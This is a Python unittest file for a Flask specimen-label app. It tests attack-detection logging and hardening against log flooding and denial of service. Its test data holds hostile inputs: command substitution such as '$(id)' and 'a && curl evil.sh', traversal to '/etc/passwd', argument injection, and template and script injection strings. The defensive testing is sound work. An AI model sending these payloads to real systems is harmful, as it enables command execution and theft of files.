"""Tests for user-problem, commodity-scanner, and targeted-attack logging."""

import json
import unittest
from unittest.mock import MagicMock, patch

try:
    import flask  # noqa: F401
    import app as labels_app
except ModuleNotFoundError as exc:
    raise unittest.SkipTest(f"Flask app dependencies are unavailable: {exc}") from exc


class DiagnosticLoggingTestCase(unittest.TestCase):
    def setUp(self):
        self._previous_testing = labels_app.app.config.get("TESTING")
        labels_app.app.config["TESTING"] = False
        labels_app._rate_limiter.reset()
        self.client = labels_app.app.test_client()
        self.addCleanup(labels_app._rate_limiter.reset)
        self.addCleanup(
            labels_app.app.config.__setitem__, "TESTING", self._previous_testing
        )

    def test_common_exploit_path_is_logged_as_internet_scanner(self):
        with patch.object(labels_app.internet_scanner_logger, "warning") as scanner:
            with patch.object(labels_app.targeted_attack_logger, "warning") as targeted:
                with patch.object(labels_app.user_problem_logger, "warning") as problem:
                    response = self.client.get("/.env")

        self.assertEqual(response.status_code, 404)
        scanner.assert_called_once()
        targeted.assert_not_called()
        problem.assert_not_called()
        event = json.loads(scanner.call_args.args[0])
        self.assertEqual(event["event"], "generic_exploit_probe")
        self.assertEqual(event["path"], "/.env")

    def test_unknown_non_app_path_is_scanner_but_label_typo_is_user_problem(self):
        with patch.object(labels_app.internet_scanner_logger, "warning") as scanner:
            with patch.object(labels_app.user_problem_logger, "warning") as problem:
                outside = self.client.get("/totally-unknown")
                label_typo = self.client.get("/labels/not-a-page")

        self.assertEqual(outside.status_code, 404)
        self.assertEqual(label_typo.status_code, 404)
        self.assertEqual(scanner.call_count, 1)
        self.assertEqual(problem.call_count, 1)
        self.assertEqual(
            json.loads(problem.call_args.args[0])["event"], "http_error_response"
        )

    @patch("app.subprocess.Popen")
    def test_command_shaped_label_option_is_targeted_attack(self, popen):
        with patch.object(labels_app.targeted_attack_logger, "warning") as targeted:
            with patch.object(labels_app.internet_scanner_logger, "warning") as scanner:
                with patch.object(labels_app.user_problem_logger, "warning") as problem:
                    response = self.client.post(
                        "/labels/print_start",
                        data={
                            "format": "rtf",
                            "sort": "custom",
                            "sort_field": "$(id)",
                            "observations[]": ["123"],
                        },
                    )

        self.assertEqual(response.status_code, 400)
        popen.assert_not_called()
        targeted.assert_called_once()
        scanner.assert_not_called()
        problem.assert_not_called()
        event = json.loads(targeted.call_args.args[0])
        self.assertEqual(event["event"], "labelmaker_exploit_payload")
        self.assertEqual(event["attack_techniques"], ["command_execution"])
        self.assertEqual(event["indicators"][0]["field"], "sort_field")
        self.assertEqual(event["indicators"][0]["value"], "$(id)")

    def test_generic_command_and_traversal_probes_stay_scanner_noise(self):
        with patch.object(labels_app.internet_scanner_logger, "warning") as scanner:
            with patch.object(labels_app.targeted_attack_logger, "warning") as targeted:
                command = self.client.get("/cgi-bin/status?cmd=$(id)")
                traversal = self.client.get("/labels?file=../../etc/passwd")

        self.assertEqual(command.status_code, 404)
        self.assertEqual(traversal.status_code, 200)
        self.assertEqual(scanner.call_count, 2)
        targeted.assert_not_called()
        techniques = {
            technique
            for call in scanner.call_args_list
            for technique in json.loads(call.args[0]).get("attack_techniques", [])
        }
        self.assertEqual(techniques, {"command_execution", "directory_traversal"})

    def test_traversal_in_real_labelmaker_field_is_targeted(self):
        with patch.object(labels_app.targeted_attack_logger, "warning") as targeted:
            with patch.object(labels_app.internet_scanner_logger, "warning") as scanner:
                with patch.object(labels_app.user_problem_logger, "warning") as problem:
                    response = self.client.get(
                        "/labels/print_stream", query_string={"job_id": "../../etc/passwd"}
                    )
                    response.get_data()

        self.assertEqual(response.status_code, 200)
        targeted.assert_called_once()
        scanner.assert_not_called()
        problem.assert_not_called()
        event = json.loads(targeted.call_args.args[0])
        self.assertEqual(event["event"], "labelmaker_exploit_payload")
        self.assertEqual(event["attack_techniques"], ["directory_traversal"])
        self.assertEqual(event["indicators"][0]["field"], "job_id")
        self.assertEqual(event["indicators"][0]["value"], "../../etc/passwd")

    def test_cross_site_write_is_targeted_attack(self):
        with patch.object(labels_app.targeted_attack_logger, "warning") as targeted:
            response = self.client.post(
                "/labels/lookup_batch",
                data={"obs_ids[]": ["123"]},
                headers={"Origin": "https://evil.example"},
            )

        self.assertEqual(response.status_code, 403)
        event = json.loads(targeted.call_args.args[0])
        self.assertEqual(event["event"], "cross_site_write_blocked")
        self.assertEqual(event["origin"], "https://evil.example")

    def test_browser_error_is_logged_with_full_diagnostics(self):
        payload = {
            "type": "javascript_error",
            "message": "token=SECRET\nsecond line",
            "source": "https://example.test/labels/static/app.js",
            "line": 42,
            "column": 7,
            "stack": "Error: boom\n at privateFunction (app.js:42)",
            "page_url": "https://example.test/labels?private=value",
        }
        with patch.object(labels_app.user_problem_logger, "warning") as problem:
            response = self.client.post("/labels/client_event", json=payload)

        self.assertEqual(response.status_code, 204)
        problem.assert_called_once()
        serialized = problem.call_args.args[0]
        event = json.loads(serialized)
        self.assertEqual(event["event"], "browser_error")
        self.assertEqual(event["message"], payload["message"])
        self.assertEqual(event["stack"], payload["stack"])
        self.assertNotIn("second line\n", serialized)

    def test_request_id_is_returned_and_logged(self):
        with patch.object(labels_app.user_problem_logger, "warning") as problem:
            response = self.client.post("/labels/lookup_batch", data={})

        self.assertEqual(response.status_code, 400)
        request_id = response.headers["X-Request-ID"]
        self.assertEqual(len(request_id), 12)
        event = json.loads(problem.call_args.args[0])
        self.assertEqual(event["request_id"], request_id)

    def test_missing_generator_output_is_logged(self):
        proc = MagicMock()
        proc.stdout.readline.return_value = ""
        proc.wait.return_value = 2
        proc.poll.return_value = 2
        job_id = "12345678-1234-4123-8123-123456789abc"
        labels_app._jobs[job_id] = {
            "proc": proc,
            "output_path": "/tmp/labels-test-output-that-does-not-exist.rtf",
            "filename": "labels.rtf",
        }
        self.addCleanup(labels_app._jobs.pop, job_id, None)

        with patch.object(labels_app.user_problem_logger, "warning") as problem:
            response = self.client.get(f"/labels/print_stream?job_id={job_id}")
            response.get_data()

        events = [json.loads(call.args[0])["event"] for call in problem.call_args_list]
        self.assertIn("label_generator_output_missing", events)


class DiagnosticHardeningTestCase(unittest.TestCase):
    """Regressions for the denial-of-service and log-retention fixes."""

    def setUp(self):
        self._previous_testing = labels_app.app.config.get("TESTING")
        labels_app.app.config["TESTING"] = False
        labels_app._rate_limiter.reset()
        self.client = labels_app.app.test_client()
        self.addCleanup(labels_app._rate_limiter.reset)
        self.addCleanup(
            labels_app.app.config.__setitem__, "TESTING", self._previous_testing
        )

    def test_payload_scan_runs_after_the_rate_limiter(self):
        """Ordering is the control that stops a scan an attacker can pay for."""
        order = [f.__name__ for f in labels_app.app.before_request_funcs[None]]
        self.assertLess(
            order.index("_enforce_request_limits"),
            order.index("_scan_request_for_attacks"),
        )

    def test_exploit_matching_cost_does_not_grow_with_payload_size(self):
        """An unbounded quantifier here made one 2 MB POST freeze the worker."""
        import time

        durations = []
        for size in (32_000, 512_000):
            payload = "{" * size
            started = time.perf_counter()
            labels_app._exploit_techniques(payload)
            durations.append(time.perf_counter() - started)

        # A 16x larger payload scanned quadratically would be ~256x slower.
        self.assertLess(durations[1], max(durations[0] * 8, 0.05))

    def test_scanned_length_is_bounded_before_matching(self):
        prefix = "A" * (labels_app.MAX_DIAGNOSTIC_SCAN_LENGTH + 10)
        self.assertEqual(labels_app._exploit_techniques(prefix + "$(id)"), [])
        self.assertEqual(
            labels_app._exploit_techniques("$(id)" + prefix), ["command_execution"]
        )

    def test_deeply_nested_client_event_is_rejected_not_a_server_error(self):
        for depth in (1_500, 50_000):
            with self.subTest(depth=depth):
                body = (
                    '{"type":"javascript_error","message":'
                    + "[" * depth
                    + "]" * depth
                    + "}"
                )
                with patch.object(labels_app.user_problem_logger, "warning"):
                    response = self.client.post(
                        "/labels/client_event",
                        data=body,
                        content_type="application/json",
                    )
                self.assertLess(response.status_code, 500)

    def test_nested_diagnostic_values_are_truncated_by_depth(self):
        nested = current = []
        for _ in range(labels_app.MAX_DIAGNOSTIC_DEPTH + 25):
            nxt = []
            current.append(nxt)
            current = nxt

        rendered = json.dumps(labels_app._bounded_diagnostic_value(nested))
        self.assertIn("truncated at depth", rendered)

    def test_one_request_cannot_write_an_oversized_attack_record(self):
        value = "$(id)" + "A" * 4_000
        with patch.object(labels_app.targeted_attack_logger, "warning") as targeted:
            self.client.post(
                "/labels/lookup_batch", data={"obs_ids[]": [value] * 50}
            )

        targeted.assert_called_once()
        record = targeted.call_args.args[0]
        event = json.loads(record)
        self.assertLessEqual(
            len(event["indicators"]), labels_app.MAX_DIAGNOSTIC_INDICATORS
        )
        for indicator in event["indicators"]:
            self.assertLessEqual(
                len(indicator["value"]), labels_app.MAX_DIAGNOSTIC_INDICATOR_LENGTH
            )
        # Small enough that a sustained flood cannot roll the log's retention.
        self.assertLess(len(record), 8_000)

    def test_rate_limit_is_a_user_problem_not_a_targeted_attack(self):
        limit, window = labels_app.RATE_LIMIT_RULES["todo"]
        for _ in range(limit + 1):
            labels_app._rate_limiter.check(("todo", "127.0.0.1"), limit, window)

        with patch.object(labels_app.targeted_attack_logger, "warning") as targeted:
            with patch.object(labels_app.user_problem_logger, "warning") as problem:
                response = self.client.post("/labels/todo", data={"text": "hi"})

        self.assertEqual(response.status_code, 429)
        targeted.assert_not_called()
        events = [json.loads(c.args[0])["event"] for c in problem.call_args_list]
        self.assertIn("endpoint_rate_limit_exceeded", events)

    def test_ordinary_label_text_is_not_flagged_as_an_attack(self):
        for value in (
            "Amanita muscaria; found in Ohio",
            "Boletus edulis - large specimen",
            "collected by A. Smith & B. Jones",
            "Russula cf. emetica (group)",
            "well-known variant",
        ):
            with self.subTest(value=value):
                self.assertEqual(labels_app._exploit_techniques(value), [])

    @patch("app.subprocess.Popen")
    def test_suppress_field_print_is_not_a_targeted_attack(self, popen):
        """The UI's "- Suppress fields" control posts custom_args[]=-Habitat."""
        with patch.object(labels_app.targeted_attack_logger, "warning") as targeted:
            response = self.client.post(
                "/labels/print_start",
                data={
                    "format": "rtf",
                    "observations[]": ["123"],
                    "custom_args[]": ["-Habitat", "+Notes"],
                },
            )

        self.assertEqual(response.status_code, 200)
        targeted.assert_not_called()

    def test_option_shaped_field_names_the_endpoint_accepts_are_not_attacks(self):
        for value in ("-Habitat", "+Habitat", "-Substrate", "-Notes"):
            with self.subTest(value=value):
                self.assertTrue(labels_app.CUSTOM_FIELD_RE.match(value))
                self.assertEqual(labels_app._exploit_techniques(value), [])

    def test_argument_injection_the_endpoint_rejects_is_still_an_attack(self):
        for value in ("--flag", "--output=/tmp/pwn", "--sort", "--rf"):
            with self.subTest(value=value):
                self.assertFalse(labels_app.CUSTOM_FIELD_RE.match(value))
                self.assertEqual(
                    labels_app._exploit_techniques(value), ["command_execution"]
                )

    def test_suppressed_field_error_still_records_its_http_error_response(self):
        """log_targeted_attack suppresses this record, so it must not fire here."""
        with patch.object(labels_app.user_problem_logger, "warning") as problem:
            response = self.client.post(
                "/labels/print_start",
                data={"format": "rtf", "custom_args[]": "-Habitat"},
            )

        self.assertEqual(response.status_code, 400)
        events = [json.loads(c.args[0])["event"] for c in problem.call_args_list]
        self.assertIn("http_error_response", events)

    def test_non_string_client_event_fields_cannot_inflate_the_record(self):
        body = {
            "type": "javascript_error",
            "message": [["A" * 4_000] * 50],
            "stack": {"nested": ["B" * 4_000] * 50},
            "line": {"not": "a number"},
        }
        with patch.object(labels_app.user_problem_logger, "warning") as problem:
            response = self.client.post("/labels/client_event", json=body)

        self.assertEqual(response.status_code, 204)
        record = problem.call_args.args[0]
        event = json.loads(record)
        self.assertEqual(event["message"], "[list omitted]")
        self.assertEqual(event["stack"], "[dict omitted]")
        self.assertNotIn("line", event)
        # A record larger than the handler's maxBytes rotates every backup out
        # of retention in a single request.
        self.assertLess(len(record), 8_000)

    def test_oversized_record_is_truncated_to_a_bounded_json_line(self):
        wide = {f"field_{i}": "A" * 4_000 for i in range(50)}
        with patch.object(labels_app.user_problem_logger, "warning") as problem:
            with labels_app.app.test_request_context("/labels/print_start"):
                labels_app.g.request_id = "abc123"
                labels_app.log_user_problem("wide_event", **wide)

        record = problem.call_args.args[0]
        self.assertLessEqual(len(record), labels_app.MAX_DIAGNOSTIC_RECORD_LENGTH)
        self.assertNotIn("\n", record)
        event = json.loads(record)
        self.assertTrue(event["record_truncated"])
        self.assertGreater(event["record_length"], len(record))
        # Identity survives truncation, or the line cannot be tied to a request.
        self.assertEqual(event["event"], "wide_event")
        self.assertEqual(event["request_id"], "abc123")
        self.assertEqual(event["path"], "/labels/print_start")

    def test_crafted_label_values_are_logged_once_by_the_request_scan(self):
        """The per-view helper this replaced could never emit; the scan does."""
        with patch.object(labels_app.targeted_attack_logger, "warning") as targeted:
            response = self.client.post(
                "/labels/print_start",
                data={"format": "rtf", "sort": "custom", "sort_field": "$(id)"},
            )

        self.assertEqual(response.status_code, 400)
        targeted.assert_called_once()
        self.assertEqual(
            json.loads(targeted.call_args.args[0])["event"],
            "labelmaker_exploit_payload",
        )

    def test_real_exploit_payloads_are_still_detected(self):
        for value, technique in (
            ("../../etc/passwd", "directory_traversal"),
            ("/etc/passwd", "directory_traversal"),
            ("--output=/tmp/pwn", "command_execution"),
            ("$(id)", "command_execution"),
            ("`whoami`", "command_execution"),
            ("a && curl evil.sh", "command_execution"),
            ("{{7*7}}", "command_execution"),
            ("<script>alert(1)</script>", "command_execution"),
            ("val\x00ue", "command_execution"),
        ):
            with self.subTest(value=value):
                self.assertIn(technique, labels_app._exploit_techniques(value))


if __name__ == "__main__":
    unittest.main()
